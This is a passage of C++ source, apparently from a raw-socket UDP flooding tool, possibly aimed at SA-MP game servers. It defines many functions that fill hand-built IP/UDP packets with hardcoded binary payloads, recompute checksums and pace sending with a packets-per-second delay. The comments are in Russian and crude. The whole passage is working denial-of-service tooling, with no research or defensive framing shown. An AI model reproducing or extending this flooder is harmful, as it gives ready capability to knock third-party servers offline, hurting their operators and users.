	memcpy((void*)udph + sizeof(struct udphdr), "\x73\x00\x48\xb7\x00\x14\xa0\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\xe7\x00\x91\x6e\x80\x22\x00\x14\x98\xf8\x19\xe8\x00\x91\x6f\x00\x22\x00\x14\x98\xf8\x2b\xe9\x00\x91\x6f\x80\x23\xc0\x14\x92\xe2\x04\xc2\x5b\x03\xd0\xea\x00\x91\x70\x00\x22\x00\x14\x5e\xf8\x17\xeb\x00\x91\x70\x80\x22\xc0\x14\x1d\xe1\x00\x00\x00\xec\x00\x91\x71\x00\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\xed\x00\x91\x71\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\xee\x00\x91\x72\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\xef\x00\x91\x72\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\xf0\x00\x91\x73\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\xf1\x00\x91\x73\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\xf2\x00\x91\x74\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\xf3\x00\x91\x74\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\xf4\x00\x91\x75\x00\x2a\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\xf5\x00\x91\x75\x80\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\xf6\x00\x91\x76\x00\x22\x00\x14\x98\xf8\x26\xf7\x00\x91\x76\x80\x22\x00\x14\x98\xf8\x14\xf8\x00\x91\x77\x00\x23\xc0\x14\x92\xe2\x0a\x75\x1a\x83\xc0\xf9\x00\x91\x77\x80\x22\x00\x14\x5e\xf8\x12\xfa\x00\x91\x78\x00\x22\xc0\x14\x1d\xe1\x01\x20\x00\xfb\x00\x91\x78\x80\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\xfc\x00\x91\x79\x00\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\xfd\x00\x91\x79\x80\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\xfe\x00\x91\x7a\x00\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 533; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0c\x00\xc8\x83\x80\x51\x60\x14\x1d\xe1\x00\xf0\x00\x19\x01\x91\x07\x80\xaa\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x1a\x01\x91\x08\x00\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x1b\x01\x91\x08\x80\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x1c\x01\x91\x09\x00\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x1d\x01\x91\x09\x80\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x1e\x01\x91\x0a\x00\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x1f\x01\x91\x0a\x80\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x20\x01\x91\x0b\x00\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x21\x01\x91\x0b\x80\xaa\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x22\x01\x91\x0c\x00\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x23\x01\x91\x0c\x80\xa2\x00\x14\x98\xf8\x23\x24\x01\x91\x0d\x00\xa2\x00\x14\x98\xf8\x16\x25\x01\x91\x0d\x80\xa3\xc0\x14\x92\xe2\x06\x16\x8a\x03\xd0\x26\x01\x91\x0e\x00\xa2\x00\x14\x5e\xf8\x15\x27\x01\x91\x0e\x80\xa2\xc0\x14\x1d\xe1\x00\xe0\x00\x28\x01\x91\x0f\x00\xaa\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x29\x01\x91\x0f\x80\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x2a\x01\x91\x10\x00\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x2b\x01\x91\x10\x80\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x2c\x01\x91\x11\x00\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x2d\x01\x91\x11\x80\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x2e\x01\x91\x12\x00\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 529; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x2b\x8b\xc8\x92\x85\xd4\xe0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x58\x17\x91\x25\x8b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x59\x17\x91\x26\x0b\xaa\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x5a\x17\x91\x26\x8b\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x5b\x17\x91\x27\x0b\xa2\x00\x14\x98\xf8\x26\x1e\x19\x91\x08\x8c\xa2\x00\x14\x98\xf8\x20\x1f\x19\x91\x09\x0c\xa3\xc0\x14\x92\xe2\x0d\x8e\xf4\x13\xd0\x20\x19\x91\x09\x8c\xa2\x00\x14\x5e\xf8\x05\x21\x19\x91\x0a\x0c\xa2\xc0\x14\x1d\xe1\x01\x40\x00\x22\x19\x91\x0a\x8c\xaa\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x23\x19\x91\x0b\x0c\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x24\x19\x91\x0b\x8c\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x25\x19\x91\x0c\x0c\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x26\x19\x91\x0c\x8c\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x27\x19\x91\x0d\x0c\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x28\x19\x91\x0d\x8c\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x29\x19\x91\x0e\x0c\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x2a\x19\x91\x0e\x8c\xaa\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x2b\x19\x91\x0f\x0c\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x2c\x19\x91\x0f\x8c\xa2\x00\x14\x98\xf8\x2b\x21\x16\x91\x0a\x0b\x22\x00\x14\x98\xf8\x08\x22\x16\x91\x0a\x8b\x23\xc0\x14\x92\xe2\x01\x59\xa1\x23\xd0\x23\x16\x91\x0b\x0b\x22\x00\x14\x5e\xf8\x16\x24\x16\x91\x0b\x8b\x22\xc0\x14\x1d\xe1\x00\x80\x00\x25\x16\x91\x0c\x0b\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 520; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x64\x8b\xc8\xaf\x05\xd5\x60\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\xca\x17\x91\x5e\x8b\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\xcb\x17\x91\x5f\x0b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\xcc\x17\x91\x5f\x8b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\xcd\x17\x91\x60\x0b\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\xce\x17\x91\x60\x8b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\xcf\x17\x91\x61\x0b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\xd0\x17\x91\x61\x8b\xa9\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\xd1\x17\x91\x62\x0b\xaa\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\xd2\x17\x91\x62\x8b\xa9\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\xd3\x17\x91\x63\x0b\xa2\x00\x14\x98\xf8\x28\x5b\x18\x91\x27\x0c\x22\x00\x14\x98\xf8\x1a\x5c\x18\x91\x27\x8c\x23\xc0\x14\x92\xe2\x0c\xf4\x2b\xb3\xd0\x5d\x18\x91\x28\x0c\x22\x00\x14\x5e\xf8\x04\x5e\x18\x91\x28\x8c\x22\xc0\x14\x1d\xe1\x00\x90\x00\x5f\x18\x91\x29\x0c\x2a\xc0\x14\x0b\xe9\x00\x00\x00\xe7\x97\x46\x87\x46\x86\x47\x23\x63\x73\x53\x47\x23\x67\x20\x10\x60\x18\x91\x29\x8c\x29\x40\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x61\x18\x91\x2a\x0c\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x62\x18\x91\x2a\x8c\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x63\x18\x91\x2b\x0c\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x64\x18\x91\x2b\x8c\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x65\x18\x91\x2c\x0c\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_tt17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 252; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0b\x8b\x48\x82\x85\x94\xa0\x14\x0b\xe7\x80\x00\x00\xb7\x26\x83\x76\x93\x76\x87\x23\x76\x86\x97\x20\x10\x18\x16\x91\x05\x8b\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x47\x26\x73\x53\x63\x56\x73\x63\x57\x23\x66\x70\x10\x19\x16\x91\x06\x0b\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc7\x36\x63\x63\x46\x53\x43\x53\x66\x77\x33\x46\x50\x10\x1a\x16\x91\x06\x8b\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x57\x36\x63\x57\x36\x53\x43\x56\x63\x46\x50\x10\x1b\x16\x91\x07\x0b\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\x17\x76\x46\x47\x76\x16\x43\x36\x16\x46\x16\x40\x10\x1c\x16\x91\x07\x8b\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x73\x66\x66\xa3\x73\x76\xa6\xa3\x73\x67\x40\x10\x1d\x16\x91\x08\x0b\x29\xc0\x14\x0b\xe8\x00\x00\x00\xc6\xa3\x67\x43\x83\x77\x43\x63\x76\xa3\x86\x63\x90\x10\x1e\x16\x91\x08\x8b\x2a\x40\x14\x0b\xe8\x80\x00\x00\xd6\xa7\x43\x73\x87\x43\x73\x83\x77\x43\x83\x77\x43\x80\x10\x1f\x16\x91\x09\x0b\x29\x40\x14\x0b\xe7\x80\x00\x00\xb6\x73\x57\x36\x53\x63\x56\x73\x63\x57\x36\x70\x10\x20\x16\x91\x09\x8b\x22\x00\x14\x98\xf8\x24", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv1(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { 0xe2, (char)(rand() & 0xFF), 0x20, (char)(rand() & 0xFF), 0x20 };
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv2(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { 0xe2, (char)(rand() & 0xFF), (char)(rand() & 0xFF), (char)(rand() & 0xFF), (char)(rand() & 0xFF) };
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 20; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x69\x81\x42\x7c\x14\x9b\xe6\x00\x00\x00\x00\x00\x00\x02\x60\x00\x00\x00\x10\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 49; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x45\x80\x42\xdc\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0\x8c\x00\x91\x35\x80\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 103; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x46\x80\x48\x9b\x00\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x8e\x00\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 32; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x47\x80\x42\xdc\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 32; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x48\x00\x42\xdc\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 32; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x10\x00\xc2\xdc\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 135; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x65\x81\x48\xa9\x00\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\xcc\x02\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0\xcd\x02\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv10(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x67\x01\x48\xa9\x40\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv11(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 135; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
